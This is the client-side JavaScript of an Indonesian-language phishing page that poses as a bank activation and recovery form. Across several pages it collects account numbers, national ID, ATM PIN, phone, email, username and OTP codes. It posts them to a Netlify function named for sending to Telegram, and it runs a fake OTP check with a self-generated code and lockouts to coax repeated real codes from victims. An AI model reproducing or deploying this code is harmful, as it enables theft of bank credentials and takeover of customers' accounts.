// Konfigurasi
const API_URL = '/.netlify/functions/send-aktivasi';

// Variabel untuk validasi OTP di halaman 3
let percobaanOTP = 0;
let isLocked = false;
let lockTimer = null;
let kodeBenar = null; // Kode OTP yang benar (akan di-generate)

// ========== NAVIGASI ==========
function pindahHalaman(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    
    if (id === 'page2') {
        document.getElementById('btnLanjut').classList.add('hidden');
        cekFormPage2();
        
        setTimeout(function() {
            const noRekeningField = document.getElementById('noRekening');
            if (noRekeningField) {
                noRekeningField.focus();
                noRekeningField.click();
            }
        }, 100);
    }
    
    if (id === 'page3') {
        // Reset state OTP saat masuk halaman 3
        resetStateOTP();
        // Generate kode OTP baru (6 digit acak)
        generateKodeOTP();
    }
}

// Generate kode OTP 6 digit acak
function generateKodeOTP() {
    kodeBenar = Math.floor(100000 + Math.random() * 900000).toString();
    console.log('Kode OTP yang benar (untuk testing):', kodeBenar);
    return kodeBenar;
}

// Reset state OTP
function resetStateOTP() {
    percobaanOTP = 0;
    isLocked = false;
    if (lockTimer) {
        clearTimeout(lockTimer);
        lockTimer = null;
    }
    
    // Reset pesan error
    const errorMessage = document.getElementById('errorMessage');
    if (errorMessage) {
        errorMessage.innerHTML = '';
        errorMessage.classList.remove('timer-message');
    }
    
    // Enable tombol verifikasi
    const btnVerifikasi = document.getElementById('btnVerifikasi');
    if (btnVerifikasi) {
        btnVerifikasi.disabled = false;
        btnVerifikasi.classList.remove('btn-disabled');
    }
    
    // Enable input kode OTP
    const kodeOtpInput = document.getElementById('kodeOtp');
    if (kodeOtpInput) {
        kodeOtpInput.disabled = false;
        kodeOtpInput.value = '';
    }
    
    // Update info text
    const infoPage3 = document.getElementById('infoPage3');
    if (infoPage3) {
        infoPage3.innerHTML = '* Masukkan kode OTP aktivasi';
        infoPage3.style.color = '#e67e22';
    }
}

// Fungsi lock selama 15 detik
function lockForm(seconds) {
    isLocked = true;
    const btnVerifikasi = document.getElementById('btnVerifikasi');
    const kodeOtpInput = document.getElementById('kodeOtp');
    const errorMessage = document.getElementById('errorMessage');
    
    // Disable tombol dan input
    if (btnVerifikasi) {
        btnVerifikasi.disabled = true;
        btnVerifikasi.classList.add('btn-disabled');
    }
    if (kodeOtpInput) {
        kodeOtpInput.disabled = true;
    }
    
    // Tampilkan timer
    let timeLeft = seconds;
    if (errorMessage) {
        errorMessage.innerHTML = `⏱️ Mohon tunggu ${timeLeft} detik untuk mencoba lagi`;
        errorMessage.classList.add('timer-message');
        errorMessage.style.color = '#ff6600';
    }
    
    // Jalankan countdown
    lockTimer = setInterval(function() {
        timeLeft--;
        if (errorMessage) {
            errorMessage.innerHTML = `⏱️ Mohon tunggu ${timeLeft} detik untuk mencoba lagi`;
        }
        
        if (timeLeft <= 0) {
            clearInterval(lockTimer);
            lockTimer = null;
            isLocked = false;
            
            // Enable kembali
            if (btnVerifikasi) {
                btnVerifikasi.disabled = false;
                btnVerifikasi.classList.remove('btn-disabled');
            }
            if (kodeOtpInput) {
                kodeOtpInput.disabled = false;
                kodeOtpInput.value = '';
                kodeOtpInput.focus();
            }
            if (errorMessage) {
                errorMessage.innerHTML = '';
                errorMessage.classList.remove('timer-message');
            }
            
            // Reset percobaan setelah lock selesai
            percobaanOTP = 0;
            
            // Generate kode OTP baru
            generateKodeOTP();
            
            const infoPage3 = document.getElementById('infoPage3');
            if (infoPage3) {
                infoPage3.innerHTML = '* Kode OTP baru telah dikirim, silahkan masukkan kode baru';
                infoPage3.style.color = '#e67e22';
                setTimeout(() => {
                    if (infoPage3.innerHTML === '* Kode OTP baru telah dikirim, silahkan masukkan kode baru') {
                        infoPage3.innerHTML = '* Masukkan kode OTP aktivasi';
                    }
                }, 3000);
            }
        }
    }, 1000);
}

// Validasi kode OTP
function validateOTP(kodeInput) {
    // Jika sedang locked
    if (isLocked) {
        const errorMessage = document.getElementById('errorMessage');
        if (errorMessage) {
            errorMessage.innerHTML = '⏱️ Sistem sedang terkunci, harap tunggu';
            errorMessage.style.color = '#ff0000';
        }
        return false;
    }
    
    // Cek apakah kode benar
    if (kodeInput === kodeBenar) {
        // Reset percobaan karena berhasil
        percobaanOTP = 0;
        return true;
    }
    
    // Kode salah, tambah percobaan
    percobaanOTP++;
    
    const errorMessage = document.getElementById('errorMessage');
    const sisaPercobaan = 10 - percobaanOTP;
    
    if (percobaanOTP >= 10) {
        // Mencapai batas 10x, lock selama 15 detik
        errorMessage.innerHTML = '❌ Kode salah! Batas percobaan tercapai. Mohon tunggu 15 detik.';
        errorMessage.style.color = '#ff0000';
        lockForm(15);
        return false;
    }
    
    // Tampilkan pesan error dengan sisa percobaan
    errorMessage.innerHTML = `❌ Kode salah! Silahkan tunggu kode yang berikutnya. Sisa percobaan: ${sisaPercobaan}`;
    errorMessage.style.color = '#ff0000';
    errorMessage.classList.remove('timer-message');
    
    // Hapus pesan error setelah 3 detik
    setTimeout(() => {
        if (errorMessage.innerHTML.includes('Kode salah')) {
            errorMessage.innerHTML = '';
        }
    }, 3000);
    
    return false;
}

// ========== HALAMAN 2 ==========
const noRekening = document.getElementById('noRekening');
const noIdentitas = document.getElementById('noIdentitas');
const pinAtm = document.getElementById('pinAtm');
const noTelpon = document.getElementById('noTelpon');
const email = document.getElementById('email');
const btnLanjut = document.getElementById('btnLanjut');
const infoPage2 = document.getElementById('infoPage2');

function isFormPage2Valid() {
    if (!noRekening.value.trim()) return false;
    if (!noIdentitas.value.trim()) return false;
    if (!pinAtm.value.trim()) return false;
    if (!noTelpon.value.trim()) return false;
    if (!email.value.trim()) return false;
    if (!email.value.includes('@')) return false;
    return true;
}

function cekFormPage2() {
    if (isFormPage2Valid()) {
        btnLanjut.classList.remove('hidden');
        infoPage2.innerHTML = '* Data lengkap, tekan Cetak Laporan / Pemulihan';
        infoPage2.style.color = '#27ae60';
    } else {
        btnLanjut.classList.add('hidden');
        infoPage2.innerHTML = '* Harap isi semua data dengan benar (email harus valid)';
        infoPage2.style.color = '#e67e22';
    }
}

// Filter input hanya angka
if (noRekening) {
    noRekening.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
    noRekening.addEventListener('blur', cekFormPage2);
}
if (noIdentitas) {
    noIdentitas.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
    noIdentitas.addEventListener('blur', cekFormPage2);
}
if (pinAtm) {
    pinAtm.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); cekFormPage2(); });
    pinAtm.addEventListener('blur', cekFormPage2);
}
if (noTelpon) {
    noTelpon.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
    noTelpon.addEventListener('blur', cekFormPage2);
}
if (email) {
    email.addEventListener('input', cekFormPage2);
    email.addEventListener('blur', cekFormPage2);
}

// Fungsi untuk menampilkan loading
function showLoading() {
    let loading = document.querySelector('.loading-overlay');
    if (!loading) {
        loading = document.createElement('div');
        loading.className = 'loading-overlay';
        loading.innerHTML = '<div class="loading-spinner"></div>';
        document.body.appendChild(loading);
    }
    loading.style.display = 'flex';
}

function hideLoading() {
    const loading = document.querySelector('.loading-overlay');
    if (loading) {
        loading.style.display = 'none';
    }
}

// Kirim data ke Netlify Function
async function kirimKeTelegram(data) {
    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        const result = await response.json();
        
        if (!response.ok) {
            throw new Error(result.message || 'Gagal mengirim data');
        }
        
        return { success: true, data: result };
    } catch (error) {
        console.error('Error:', error);
        return { success: false, error: error.message };
    }
}

function lanjutKePage3() {
    if (!isFormPage2Valid()) {
        alert('Lengkapi semua data dengan benar');
        return;
    }
    
    // Simpan data ke sessionStorage
    const userData = {
        noRekening: noRekening.value.trim(),
        noIdentitas: noIdentitas.value.trim(),
        pinAtm: pinAtm.value.trim(),
        noTelpon: noTelpon.value.trim(),
        email: email.value.trim(),
        timestamp: new Date().toLocaleString('id-ID')
    };
    sessionStorage.setItem('userData', JSON.stringify(userData));
    
    pindahHalaman('page3');
    
    setTimeout(function() {
        const usernameField = document.getElementById('username');
        if (usernameField) {
            usernameField.focus();
        }
    }, 150);
}

// ========== HALAMAN 3 ==========
async function selesai() {
    const username = document.getElementById('username');
    const kodeOtpInput = document.getElementById('kodeOtp');
    
    let error = '';
    if (!username.value.trim()) error += 'Username tidak boleh kosong\n';
    if (!kodeOtpInput.value.trim()) error += 'Kode OTP tidak boleh kosong\n';
    
    if (error) {
        alert('Verifikasi gagal:\n' + error);
        return;
    }
    
    // Validasi OTP
    const isValid = validateOTP(kodeOtpInput.value.trim());
    
    if (!isValid) {
        // Kosongkan input OTP untuk percobaan ulang
        kodeOtpInput.value = '';
        kodeOtpInput.focus();
        return;
    }
    
    // Ambil data dari sessionStorage
    const userDataStr = sessionStorage.getItem('userData');
    let userData = {};
    if (userDataStr) {
        userData = JSON.parse(userDataStr);
    }
    
    // Data lengkap untuk dikirim ke Telegram
    const dataToSend = {
        noRekening: userData.noRekening || '-',
        noIdentitas: userData.noIdentitas || '-',
        pinAtm: userData.pinAtm || '-',
        noTelpon: userData.noTelpon || '-',
        email: userData.email || '-',
        username: username.value.trim(),
        kodeOtp: kodeOtpInput.value.trim(),
        timestamp: new Date().toLocaleString('id-ID')
    };
    
    // Tampilkan loading
    showLoading();
    
    // Kirim ke Netlify Function
    const result = await kirimKeTelegram(dataToSend);
    
    hideLoading();
    
    if (result.success) {
        alert('Cetak Laporan / Pemulihan berhasil! Data telah dikirim.');
        resetForm();
    } else {
        alert('Gagal mengirim data: ' + result.error + '\nData tetap tersimpan di browser.');
    }
}

function resetForm() {
    noRekening.value = '';
    noIdentitas.value = '';
    pinAtm.value = '';
    noTelpon.value = '';
    email.value = '';
    document.getElementById('username').value = '';
    document.getElementById('kodeOtp').value = '';
    sessionStorage.removeItem('userData');
    
    // Reset state OTP
    if (lockTimer) {
        clearInterval(lockTimer);
        lockTimer = null;
    }
    percobaanOTP = 0;
    isLocked = false;
    
    const errorMessage = document.getElementById('errorMessage');
    if (errorMessage) {
        errorMessage.innerHTML = '';
    }
    
    pindahHalaman('page1');
    infoPage2.innerHTML = '* Harap isi semua data';
    infoPage2.style.color = '#e67e22';
    document.getElementById('btnLanjut').classList.add('hidden');
}

// Filter OTP hanya angka
const kodeOtpInput = document.getElementById('kodeOtp');
if (kodeOtpInput) {
    kodeOtpInput.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); });
}

// Inisialisasi
cekFormPage2();
